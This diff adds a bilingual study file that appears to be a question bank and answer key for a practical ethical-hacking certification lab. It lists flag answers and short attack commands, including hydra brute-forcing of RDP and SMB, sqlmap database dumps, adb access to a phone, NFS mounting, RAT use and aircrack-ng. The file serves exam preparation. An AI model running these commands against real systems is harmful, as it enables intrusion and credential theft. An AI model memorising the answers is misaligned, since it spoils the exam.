@@ -1,0 +1,388 @@
+考試題目_20241101 (1) 1
+考試題目_20241101 (1)
+說明：
+1. 15題及格(75%)，每題可以答3次。
+3. 每個題目最後會有答案格式(NA*aNaa**A)，N代表數字，A代表大寫字母，a代表
+小寫字母，*代表符號，.代表點，-代表連字號。
+4. 應該要有適當的操作流程，答案僅供參考，不建議直接填上去（有發生過題目一
+樣答案不一樣）。
+5. 題目下方會有參考解題方式，對不同人來說可能過於簡略，而且不保證正確，僅
+供參考。
+6. 建議在LAB裡面至少操作過一遍，在筆記中補上遇到的問題。
+環境：
+Avallable target networks:
+10.10.55.0/24
+192.168.44.0/24
+192.168.200.0/24
+Exclusions:
+10.10.55.1-2
+192.168.44.1-2
+EH - Workstation-1(ParrotSecurity)
+attacker:toor
+EH - Workstation-2(Windows 11)
+Admin:Pa$$w0rd
+OpenVAS on Parrot
+admin:password
+題目：
+考試題目_20241101 (1) 2
+
+
+
+
+1. Perform an extensive scan of the target network and identify the Product
+Version of the Domain Control. (NN.N.NNNNN)
+對目標網路進行廣泛掃描並識別網域控制的產品版本。
+➡️ 10.0.20348
+sudo nmap -A <target>
+sudo nmap -O <target> -Pn
+Reference screenshot:
+
+
+
+2. While investigating an attack, you found that a Windows web development
+environment was exploited to gain access to the system. Perform extensive
+scanning and service enumeration of the target networks and identify the
+number of mercury services running in the Server. (N)
+在調查攻擊時，您發現Windows Web 開發環境已被利用來取得對系統的存取權
+限。對目標網路執行廣泛的掃描和服務枚舉，並確定伺服器中運行的mercury服
+務的數量。
+➡️ 7
+考試題目_20241101 (1) 3
+nmap
+
+
+
+3. Identify a machine with RDP service enabled in the 10.10.55.0/24 subnet.
+Crack the RDP credentials for user Jones and obtain a file hide.cfe
+containing an encrypted image file. Decrypt the file and enter the CRC32
+value of image file as the answer. Note: Use Jones’s password to extract
+the image file. (NaaNNNaa)
+辨識10.10.55.0/24 子網路中啟用了RDP 服務的電腦。破解使用者Jones 的
+RDP 憑證並取得包含加密影像檔案的hide.cfe 檔案。解密檔案並輸入影像檔案的
+CRC32 值作為答案。注意：使用Jones 的密碼來提取圖像檔案。
+➡️ -
+sudo nmap 10.10.55.0/24 -p3389 -sVC
+hydra -l Jones -P ~/Desktop/password.txt rdp://10.10.55.
+X
+# Find hide.cfe, then use CryptoForge to decrypt the fil
+e by Jones's password.
+# Use HashCalc to get CRC32 of the image file.
+
+
+
+4. An insider attack involving one of the employee's mobile device in the
+10.10.55.0/24 subnet has been identified, You are assigned ta covertly
+access the user's device and obtain hidden data in the image Tle stored,
+Analyze the image file and extract the sensitive data hidden in the file and
+enter the secret code as the answer. (A*AaAa*AN)
+已識別出涉及10.10.55.0/24 子網路中員工的行動裝置之一的內部攻擊，您被指派
+秘密存取使用者的裝置並獲取儲存的影像檔案中的隱藏數據，分析影像檔案並提
+取敏感資料隱藏在文件中並輸入密碼作為答案。
+➡️ -
+考試題目_20241101 (1) 4
+# ParrotOS
+sudo nmap 10.10.55.* -p5555
+# sudo apt install -y adb
+adb connect 10.10.55.X:5555
+# Android
+# Try to find Capture.png
+find / -name Capture.png 2>/dev/null
+# find / -name *.png 2>/dev/null
+# Pull to ParrotOS.
+sudo adb pull Capture.png
+# If "adb pull" failed, copy the Capture.png to another
+folder and pull again.
+# File transfer to Win11, then OpenStego.
+
+
+
+
+5. Perform a vulnerability scan for the host with IP address 192.168.44.32.
+What is the CVE number of the vuinerability with least severity score?
+(AAA-NNNN-NNNN)
+對IP位址192.168.44.32的主機進行漏洞掃描。嚴重性評分最低的漏洞的CVE 編
+號是多少？
+➡️ CVE-2020-7068
+gvm-start
+# Open OpenVAS Web UI
+https://127.0.0.1:9392
+# ...
+考試題目_20241101 (1) 5
+
+
+
+
+6. Exploit a remote login and command-line execution application on a Linux
+target in the 10.10.55.0/24 subnet to access a sensitive file, Netnormal.txt.
+Enter the content in the file as the answer. (ANaN*aNaN)
+利用10.10.55.0/24 子網路中Linux 目標上的遠端登入和命令列執行應用程式來存
+取敏感檔案Netnormal.txt。輸入文件中的內容作為答案。
+➡️ H0m3@l0n3
+# NFS Privilege Escalation.
+nmap 10.10.55.0/24 -p111,2049
+# showmount -e 10.10.55.X
+mkdir /tmp/nfs
+sudo mount -t nfs 10.10.55.X:/ /tmp/nfs
+sudo df -h # 看磁碟
+find /tmp/nfs -name Netnormal.txt 2>/dev/null
+cat /tmp/nfs/<PATH>/Netnormal.txt
+考試題目_20241101 (1) 6
+
+
+
+
+7. An ex-employee of an organization has stolen a vital account credential and
+stored It in a fie named restricted.txt before leaving the organization. The
+credential is a nine-character alpha-numeric string. Enter the credential as
+the answer. The restricted.txt file has been identified from the employee's
+email attachment and stored in the "EH Workstation - 2" machine in the
+Documents folder, Note: You have learned that "password" is the key to
+extracting credentials from the restricted.txt file. (Format: aaaaa*NNN)
+某組織的前員工在離開組織之前竊取了重要帳戶憑證並將其儲存在名為
+restricted.txt 的檔案中。該憑證是一個九個字元的字母數字字串。輸入憑證作為
+答案。已從員工的電子郵件附件中識別出restricted.txt文件，並將其儲存在「EH
+Workstation - 2」機器的Documents資料夾中，注意：您已了解「password」
+是從restricted.txt檔案中提取憑證的關鍵。
+➡️ -
+考試題目_20241101 (1) 7
+# "password" is the password.
+C:\CEH-Tools\SNOW.EXE -C -p password restricted.txt
+# You'll get a base64-encoded string, decode it.
+powershell
+$base64 = "SGVsbG8gd29ybGQh"
+$decodedBytes = [System.Convert]::FromBase64String($base
+64)
+$decodedString = [System.Text.Encoding]::UTF8.GetString
+($decodedBytes)
+$decodedString
+Hello world!
+# Fail by using SNOW.EXE and BCTextEncoder.
+# Try other text stego tools?
+
+
+
+
+8. Exploit weak credentials used for SMB service on a Windows machine in
+the 10.10.55.0/24 subnet. Obtain the file, Sniffer.txt hosted on the SMB root,
+and enter its content as the answer. (a*aaNaNNa)
+利用10.10.55.0/24 子網路中Windows 電腦上用於SMB 服務的弱憑證。取得託
+管在SMB 根目錄上的檔案Sniffer.txt，並輸入其內容作為答案。
+➡️ h@ck3r00t
+nmap -p139,445 --open 10.10.55.0/24
+hydra -L ~/Desktop/username.txt -P ~/Desktop/password.tx
+t smb://10.10.55.X
+enum4linux -u USER -p PASSWD -a 10.10.55.X
+# Use smbclient.
+smb> get Sniffer.txt
+smb> exit
+考試題目_20241101 (1) 8
+cat Sniffer.txt
+
+
+
+
+9. You are assigned to analyze and perform static-malware analysis on a
+malicious executable file hell.exe located in Downloads folder of EH
+Workstation-2. Determine the Linker Version number of the executable file
+as answer. (N*NN)
+您被指派對位於EH Workstation-2 的下載資料夾中的惡意執行檔hell.exe 進行
+分析和執行靜態惡意軟體分析。確定可執行檔的連結器版本號作為答案。
+➡️ 2.37
+exiftool hell.exe
+# or use PEiD.
+Reference screenshot:
+
+
+
+
+10. A disgruntled ex-employee Martin has hidden some confidential files in a
+folder "Scan" in a Windows machine in the 10.10.55.0/24 subnet. You can
+not physically access the target machine, but you know that the
+organization has installed a RAT in the machine for remote administration
+purposes. Your task is to check how many files present in the Scan Folder
+and enter the number of files sniffed by the employee as answer. (N)
+考試題目_20241101 (1) 9
+心懷不滿的前員工Martin 將一些機密文件隱藏在10.10.55.0/24 子網路中
+Windows 電腦的「Scan」資料夾中。您無法實際存取目標計算機，但您知道組
+織已在計算機中安裝RAT 以用於遠端管理目的。您的任務是檢查「Scan」資料夾
+中存在多少文件，並輸入員工嗅探的文件數量作為答案。
+➡️ 5
+📁 E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Trojans
+Types\Remote Access Trojans (RAT)\
+njRAT default port is 5552.
+(Use Wireshark to monitor RAT application traffic on the network.)
+Use the RAT tool to view the number of files in the Scan folder.
+Or try other RATs(ProRat: 5110, Theef: 6703).
+
+
+
+
+11. During an assignment, an Incident responder has retained a suspicious
+executable file "Strange_File-1". Your task as a malware analyst is to
+determine the size of the PT_LOAD(0) segment using the SHA224 hash
+method. The file is in the C:\Users\Admin\Documents directory in the "EH
+Workstation - 2" machines. (NNNaNNaa)
+考試題目_20241101 (1) 10
+在執行任務期間，事件回應人員保留了可疑的可執行檔「Strange_File-1」。身為
+惡意軟體分析師，您的任務是使用SHA224 雜湊方法來確定PT_LOAD(0) 段的大
+小。該檔案位於「EH Workstation - 2」電腦的C:\Users\Admin\Documents 目
+錄中。
+➡️ -
+📁 E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware
+Analysis Tools\Static Malware Analysis Tools\Packaging and
+Obfuscation Tools\DIE
+Reference screenshot:
+
+
+
+
+12. You are investigating a massive DDoS attack launched against a target at
+172.22.10.10. Your objective is to identify the packets responsible for the
+attack and determine the least IPv4 packet count sent to the victim
+machine. The network capture file "Evil-traffic.pcapng" is saved in the
+Documents folder of the "EH Workstation - 2" (Windows 11) machine.
+(NNNNN)
+您正在調查針對172.22.10.10 目標所發動的大規模DDoS 攻擊。您的目標是識別
+造成攻擊的封包並確定傳送到受害電腦的最少IPv4 封包計數。網路擷取檔案
+「Evil-traffic.pcapng」保存在「EH Workstation - 2」(Windows 11)機器的
+Documents資料夾中。
+考試題目_20241101 (1) 11
+➡️ 19554
+Wireshark > Statistics > IPv4 statistics > All Addressess.
+
+
+
+
+13. Perform the SQL injection attack on your target web application
+cinema.cehorg.com and extract the password of user Daniel. You have
+already registered on the website with credentials Karen/computer.
+(aaaaaaaaaa)
+對目標Web 應用程式cinema.cehorg.com 執行SQL 注入攻擊並提取使用者
+Daniel 的密碼。您已經使用Karen/computer 憑證在網站上註冊。
+➡️ qwertyuiop
+sqlmap -u "http://x.x.x/x.xxx?id=1" --cookie "<COOKIE>"
+--dbs
+sqlmap -u "http://x.x.x/x.xxx?id=1" --cookie "<COOKIE>"
+-D <db> --tables
+sqlmap -u "http://x.x.x/x.xxx?id=1" --cookie "<COOKIE>"
+-D <db> -T <tb> --dump
+
+
+
+
+14. Exploit the web application available at www.cehorg.com and enter the
+flag's value at the page with page_id=95 (A**NNAA)
+利用www.cehorg.com 上提供的Web 應用程序，並在page_id=95 的頁面上輸
+入標誌值。
+➡️ B$#98TY
+# Browse URL/page_id=95, go down and you'll see the fla
+g.
+# Or try nikto.
+考試題目_20241101 (1) 12
+
+
+
+
+15. Perform vulnerability research and exploit the web application
+training.cehorg.com, available at 192.168.44.64. Locate the Flag.txt file and
+enter its content as the answer.
+執行漏洞研究並利用Web 應用程式training.cehorg.com 位於192.168.44.64。
+找到Flag.txt 檔案並輸入其內容作為答案。
+➡️ M@d(y535
+# curl http://192.168.44.64/Flag.txt
+or
+# dirsearch -u http://192.168.44.64
+
+
+
+
+16. Perform SOL injection attack on a web application, cybersec.cohorg.com,
+available at 172.20.0.22. Find the value in the Flag column in one of the DB
+tables and enter it as the answer. (*aNNaNAA)
+對Web 應用程式cybersec.cehorg.com位於172.20.0.22 執行SQL 注入攻擊。
+在資料庫表之一的「標誌」欄位中找到值並將其輸入作為答案。
+➡️ (y83r5EC
+(unverified) sqlmap -u cybersec.cehorg.com --dbs --dump
+sqlmap -u cybersec.cehorg.com/x.xxx?id=1 --cookie="<COOK
+IE>" --dbs --dump
+# devilcorp
+
+
+
+
+17. A file named Encode.txt has been uploaded through DVWA
+(http://172.20.0.16:8080/DVWA). The file is located in the
+"C:\wamp64\www\DVWA\ECweb\Certified\" directory. Access the file and
+decode the base64 ciphers to reveal the original message. Enter the
+考試題目_20241101 (1) 13
+decrypted message as the answer. You can log into the DVWA using the
+credentials admin/password. (A**aa*AA)
+名為Encode.txt檔案已透過DVWA（http://172.20.0.16:8080/DVWA）上傳。檔
+案位於「C:\wamp64\www\DVWA\ECweb\Certified\」目錄中。存取該文件並
+解碼Base64 密碼以揭示原始訊息。輸入解密的訊息作為答案。您可以使用憑證
+admin/password 登入DVWA。
+➡️ H^(ker@EC
+wget http://172.20.0.16:8080/DVWA/ECweb/Certified/Encod
+e.txt
+# If there's no Encode.txt file, just browse the path "h
+ttp://172.20.0.16:8080/DVWA/ECweb/Certified/", you'll se
+e some files.
+# Or command inject, Enable RDP. Find the files.
+base64 -d Encode.txt
+
+
+
+
+18. Analyze the traffic capture from an IoT network located in the Documents
+folder of the "EH Workstation - 1" (ParrotSecurity) machine, identify the
+packet with IoT Publish Message, and enter the topic length as the answer.
+(N)
+分析來自位於「EH Workstation - 1」(ParrotSecurity) 電腦的文件資料夾中的
+IoT 網路的流量捕獲，識別包含IoT 發布訊息的資料包，並輸入主題長度作為答
+案。
+➡️ 9
+Wireshark, MQTT, Publish Message, Topic Length.
+Reference screenshot:
+考試題目_20241101 (1) 14
+
+
+
+
+19. A disgruntled employee of your target organization has stolen the
+company's trade secrets and encrypted them using VeraCrypt. The
+VeraCrypt volume file "Its_File" is stored on the C: drive of the "EH
+Workstation - 2" machine. The password required to access the VeraCrypt
+volume has been hashed and saved in a txt file in the Documents folder of
+"EH Workstation - 1" (ParrotSecurity) machine. As an ethical hacker
+working with the company, you need to decrypt the hash in the
+Hash2crack.txt file, access the Veracrypt volume, and find the secret code
+in the file named EC_data.txt. (NA*aNaa**A)
+目標組織的一名不滿的員工竊取了公司的商業機密，並使用VeraCrypt 對其進行
+了加密。VeraCrypt 磁碟區檔案「Its_File」儲存在「EH Workstation - 2」電腦
+的C: 磁碟機上。存取VeraCrypt 磁碟區所需的密碼已被hash並保存在「EH
+Workstation - 1」(ParrotSecurity) 電腦的文件夾中的txt 檔案中。作為與公司合
+作的道德駭客，您需要解密Hash2crack.txt 檔案中的雜湊值，存取Veracrypt
+卷，並在名為EC_data.txt 的檔案中找到秘密程式碼。
+➡️ 3C_c0un(!L
+Google(or crackstation.net) the hash value in Hash2crack.txt.
+Then use VeraCrypt.
+考試題目_20241101 (1) 15
+
+
+
+
+20. Your organization suspects the presence of a rogue AP in the vicinity. You
+are tasked with cracking the wireless encryption, connecting to the
+network, and setting up a honeypot. The airdump-ng tool has been used,
+and the Wi-Fi traffic capture named "W!F!Pcap.cap" is located in the
+Documents folder in the "EH Workstation - 1" (ParrotSecurity) machine.
+Crack the wireless encryption and enter the total number of characters
+present in the Wi-FI password. (Format: N)
+您的組織懷疑附近有惡意AP。您的任務是破解無線加密、連接到網路並設定蜜
+罐。已使用airdump-ng工具，名為「W!F!Pcap.cap」的Wi-Fi流量擷取位於
+「EH Workstation - 1」（ParrotSecurity）機器的Documents資料夾中。破解
+無線加密並輸入Wi-Fi 密碼中的字元總數。
+➡️ 9
+aircrack-ng W!relessCapture.cap -w ~/Desktop/password.tx
+t
+
